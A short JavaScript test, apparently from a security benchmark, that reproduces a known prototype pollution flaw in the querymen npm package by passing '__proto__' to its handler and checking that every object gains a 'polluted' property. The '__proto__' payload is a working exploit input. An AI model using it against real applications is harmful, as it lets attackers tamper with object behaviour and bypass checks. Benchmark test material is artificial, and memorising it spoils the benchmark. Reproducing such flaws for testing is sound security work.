//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
test("prototype pollution in querymen", () => {
  var a = require("querymen");
  obj = {};

  expect({}.polluted).toBe(undefined);

  a.handler(process.env.SECBENCH_PAYLOAD || "__proto__", "polluted", "yes");
  expect({}.polluted).toBe("yes");
});
